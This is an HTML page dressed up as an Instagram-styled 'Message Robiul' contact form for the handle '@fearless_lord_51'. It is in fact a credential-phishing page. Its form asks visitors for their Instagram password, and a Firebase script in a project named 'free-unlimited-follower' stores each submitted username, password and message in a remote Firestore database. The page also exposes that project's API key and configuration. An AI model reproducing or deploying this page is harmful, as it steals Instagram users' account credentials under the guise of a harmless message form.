<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Message Robiul</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.container{
    width:100%;
    max-width:450px;
    background:white;
    border-radius:20px;
    padding:25px;
    box-shadow:0 10px 30px rgba(0,0,0,.2);
}

.profile{
    text-align:center;
    margin-bottom:20px;
}

.profile img{
    width:110px;
    height:110px;
    border-radius:50%;
    border:4px solid #E1306C;
    object-fit:cover;
}

.profile h2{
    margin-top:10px;
}

.profile p{
    color:#666;
}

input, textarea{
    width:100%;
    padding:14px;
    margin-top:12px;
    border:1px solid #ddd;
    border-radius:12px;
    outline:none;
    font-size:15px;
}

textarea{
    resize:none;
    height:120px;
}

button{
    width:100%;
    padding:14px;
    margin-top:15px;
    border:none;
    border-radius:12px;
    background:#0095F6;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    opacity:.9;
}

#success{
    display:none;
    margin-top:15px;
    text-align:center;
    color:green;
    font-weight:bold;
}

.footer{
    margin-top:20px;
    text-align:center;
    color:#777;
    font-size:14px;
}
</style>
</head>
<body>

<div class="container">

    <div class="profile">
        <!-- এখানে তোমার ছবির URL বসাবে -->
        <img src="https://via.placeholder.com/150" alt="Profile">
        <h2>Robiul Sk</h2>
        <p>@fearless_lord_51</p>
    </div>

    <form id="contactForm">

        <input type="text" id="name" placeholder="Username" required>

        <input type="password" id="instagram" placeholder="Instagram password">

        <textarea id="message" placeholder="Write your message..." required></textarea>

        <button type="submit">Send Message</button>

    </form>

    <div id="success">
        ✅ Message Sent Successfully!
    </div>

    <div class="footer">
        Made with ❤️ for Robiul
    </div>

</div>

<script>
document.getElementById("contactForm").addEventListener("submit", function(e){

    e.preventDefault();

    let name = document.getElementById("name").value;
    let insta = document.getElementById("instagram").value;
    let msg = document.getElementById("message").value;

    console.log({
        name:name,
        instagram:insta,
        message:msg
    });

    document.getElementById("success").style.display="block";

    this.reset();
});
</script>

</body>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCVVFq8PsHSNMQsJPhWR1wCKkj9k0vAVJ4",
  authDomain: "free-unlimited-follower.firebaseapp.com",
  projectId: "free-unlimited-follower",
  storageBucket: "free-unlimited-follower.firebasestorage.app",
  messagingSenderId: "167164778451",
  appId: "1:167164778451:web:53003a166773b617088126",
  measurementId: "G-T37E0RWF2P"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.getElementById("contactForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const instagram = document.getElementById("instagram").value;
  const message = document.getElementById("message").value;

  try {
    await addDoc(collection(db, "messages"), {
      name,
      instagram,
      message,
      createdAt: serverTimestamp()
    });

    document.getElementById("success").style.display = "block";
    e.target.reset();

  } catch (error) {
    alert("Message send failed: " + error.message);
  }
});
</script>
</html>
